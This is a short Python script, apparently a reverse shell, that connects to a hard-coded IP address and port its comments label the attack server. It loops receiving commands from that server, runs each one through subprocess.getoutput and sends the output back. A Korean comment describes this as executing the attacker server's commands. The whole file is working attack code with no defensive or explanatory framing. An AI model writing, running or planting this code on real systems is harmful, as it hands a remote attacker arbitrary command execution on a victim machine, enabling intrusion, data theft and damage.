import socket
import subprocess

host = "210.94.179.19" #address of attack_server
port = 9213 #port of attack_server

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))

while True:
    # 공격자 서버에서 명령 수신 및 실행
    data = s.recv(1024).decode()
    if not data:
        break
    output = subprocess.getoutput(data)
    s.sendall(output.encode())